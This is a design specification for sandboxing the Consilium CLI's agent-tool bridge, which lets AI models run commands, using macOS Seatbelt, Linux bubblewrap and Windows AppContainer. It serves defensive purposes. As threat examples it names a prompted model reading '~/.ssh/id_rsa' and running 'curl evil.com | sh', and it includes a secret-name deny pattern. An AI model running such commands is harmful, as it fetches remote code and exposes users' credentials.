# CLI Sandbox Design Specification

**Status:** Design only. Implementation deferred. The `--sandbox` flag currently routes to `packages/cli/src/utils/sandbox-stub.ts`, which prints a message pointing here.

**Goal:** Run a Consilium debate (and especially the agent-tool bridge) inside an OS-native sandbox so the council can read/write files and execute commands without the risk of escaping the project directory, leaking secrets, or making unauthorized network calls. The sandbox is a *security* layer that complements `--worktree` (which is a *git* isolation layer).

---

## Background

The agent-tool bridge exposes `Read`, `Edit`, `Grep`, `Bash`, and MCP-server-provided tools to council models. The current isolation guarantee is: the bridge refuses to operate outside the resolved project root, redacts secrets, and enforces a write-permission prompt. That is good but not OS-enforced; a creatively-prompted model could try to read `~/.ssh/id_rsa` or execute `curl evil.com | sh` via Bash, and the only defense is the bridge's own allow-list and the user's vigilance.

A native sandbox makes the allow-list OS-enforced: the kernel says "no" even if the bridge says "yes". This is the same model Claude Code, Cursor, and Replit Agent use.

---

## Goals

1. **Filesystem confinement.** Read access is restricted to the project root (and optional read-only paths like `~/.config/git`). Write access is restricted to the worktree under `--worktree` (or the explicit `--sandbox-writable` paths).
2. **Network control.** Default = no network for spawned subprocesses except the Consilium API (and any user-allowed origins). Toggle with `--sandbox-network on|off`.
3. **Environment variable allow-list.** Spawned processes see only the variables we whitelist. Default: `PATH`, `HOME`, `USER`, `LANG`, `TERM`, `CONSILIUM_API_URL`. Secrets in the parent process are not inherited.
4. **No privilege escalation.** Sandbox itself runs as the same user; we never need sudo.
5. **Cross-OS** with the same UX. Each OS uses its native primitive; the CLI hides the difference behind one `--sandbox` flag.

---

## Non-goals

- Defending against a malicious LLM provider (we trust the model's *intent* but verify its *output*).
- Running the entire CLI under sandbox (only the agent-tool bridge's subprocess executions need it).
- Kernel-level CPU/memory quotas (cgroups v2 work, but punted to Phase 2).
- Running the agents service under sandbox (that's a server-side concern; this spec is CLI-only).

---

## Per-OS implementation

### macOS — Seatbelt (sandbox-exec)

macOS ships `sandbox-exec` with a Scheme-like profile language (`.sb` files). Already used by Chrome and the Apple sandbox proper.

```
(version 1)
(deny default)
(allow process-exec)
(allow process-fork)
(allow file-read* (subpath "/Users/me/projects/foo"))
(allow file-read* (literal "/etc/passwd"))
(allow file-read* (subpath "/Library/Frameworks"))
(allow file-write* (subpath "/Users/me/.consilium/worktrees/<uuid>"))
(deny network*)
(allow network* (remote tcp "*:443" "api.myconsilium.xyz"))
```

We generate this profile per debate, drop it in `~/.consilium/sandbox/<debateId>.sb`, then exec the bridge's subprocess via `sandbox-exec -f <profile> <cmd>`. Apple has officially deprecated this API but it still ships and is widely used; we monitor the deprecation but treat it as stable.

### Linux — bubblewrap (bwrap)

`bwrap` is the de-facto Linux sandbox (used by Flatpak). Installed by default on most Wayland-era distros; documented install on others.

```
bwrap \
  --ro-bind /usr /usr \
  --ro-bind /etc /etc \
  --proc /proc --dev /dev \
  --bind /home/me/projects/foo /home/me/projects/foo \
  --bind /home/me/.consilium/worktrees/<uuid> /home/me/.consilium/worktrees/<uuid> \
  --unshare-net \
  --setenv PATH /usr/local/bin:/usr/bin:/bin \
  --setenv HOME /home/me \
  <cmd>
```

Network: `--unshare-net` blocks all; we re-enable via `--share-net` + a slirp4netns / pasta side-channel that only allows the Consilium API origin. Simpler v1: full block or full open, document the tradeoff.

### Windows — AppContainer

Windows AppContainer is the same primitive UWP uses. We create a per-debate container with `CreateAppContainerProfile`, then `STARTUPINFOEX` to launch the subprocess inside it. Filesystem ACLs map directly; network is controlled by `INetFwRule` rules scoped to the container SID.

Fallback for older Windows: launch the subprocess as a different low-integrity user account that has read-only access to `%USERPROFILE%` minus secret directories. Less elegant but works back to Windows 10.

---

## Permission grammar

A small DSL the user can extend in `~/.consilium/sandbox.yaml`:

```yaml
default:
  filesystem:
    read:
      - <project>
      - ~/.config/git
    write:
      - <worktree>
  network:
    allow:
      - api.myconsilium.xyz
      - sentry.io
  env:
    pass:
      - PATH
      - HOME
      - LANG
      - TERM
profiles:
  open:
    network: { allow: ['*'] }
  paranoid:
    filesystem: { read: [<project>], write: [] }
    network: { allow: [api.myconsilium.xyz] }
```

CLI: `consilium debate ... --sandbox --sandbox-profile paranoid`.

`<project>` and `<worktree>` are placeholders the CLI resolves at debate-start.

---

## Restricted environment variables

The sandbox process inherits only a hardcoded allow-list. Notably absent:

- `*_API_KEY`, `*_SECRET`, `*_TOKEN`, anything matching `(?i)(secret|token|password|key|credential)`.
- `AWS_*`, `GCP_*`, `AZURE_*` cloud creds.
- `GITHUB_TOKEN`, `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`.

The CLI handles API authentication for the API itself before spawning the subprocess; the subprocess does not need any keys.

---

## Network on/off semantics

| Mode | Default | Behavior |
|------|---------|----------|
| `--sandbox-network on` | n/a | Subprocess can reach any origin (still sandboxed for filesystem). |
| `--sandbox-network off` | default | Subprocess can reach only the configured `allow` list. |
| `--sandbox-network none` | n/a | Subprocess has no network at all. |

DNS leakage is plugged by routing DNS through the local resolver only and dropping outbound UDP/53 to other endpoints.

---

## Failure modes + fallbacks

| Condition | Behavior |
|-----------|----------|
| `sandbox-exec` not available (macOS < 10.15 unsupported) | Print warning, refuse `--sandbox`, suggest `--worktree`. |
| `bwrap` not installed | Print install instructions for distro, refuse `--sandbox`. |
| Windows AppContainer creation fails | Fall back to low-integrity user account; warn if even that fails. |
| User passes `--sandbox` without `--worktree` | Implicit `--worktree` so writes go to a disposable tree. |
| Subprocess hits a denied syscall | Print the syscall + path in red so the user can add it to the profile if intentional. |

---

## Telemetry + audit

The sandbox layer logs every denied syscall to `~/.consilium/sandbox/<debateId>.audit.jsonl`. The CLI `--debug` flag tails this file. We do NOT ship audit logs off-device by default; opt-in via `consilium config set sandboxTelemetry true`.

---

## Implementation order (when picked up)

1. Spec sandbox.yaml schema (zod) + sandbox profile generator (no exec yet).
2. macOS Seatbelt profile generation + integration test that runs a subprocess that tries to read `~/.ssh/id_rsa` and asserts it's blocked.
3. Linux bwrap integration test (same assertion).
4. Windows AppContainer integration test on a Server 2022 GitHub runner.
5. Wire the `--sandbox` flag in `packages/cli/src/commands/debate.ts` to call into the new `utils/sandbox.ts` module (replaces the current stub).
6. Document install steps + per-OS quirks in `packages/cli/README.md`.
7. Threat model + security review by an external reviewer before promoting from beta.

---

## Open questions

- Should sandboxed subprocesses persist their working tree between runs? Probably no — the worktree handles persistence and the sandbox is per-process.
- How do we surface sandbox events in the debate transcript? Maybe a `tool:sandbox_denied` SSE event the council models can see and adjust their next call.
- Should the agents-service-hosted tool dispatcher *also* sandbox calls when running in a hosted deployment? Spec'd separately; not this design.

## References

- macOS sandbox-exec documentation: Apple Sandbox Reference (deprecated but stable).
- bubblewrap: github.com/containers/bubblewrap.
- Windows AppContainer: Microsoft Win32 / Sandboxing docs.
- Claude Code sandbox (Anthropic), reverse-engineered from public blog posts.
- Chrome sandbox design doc (lessons on syscall filtering).
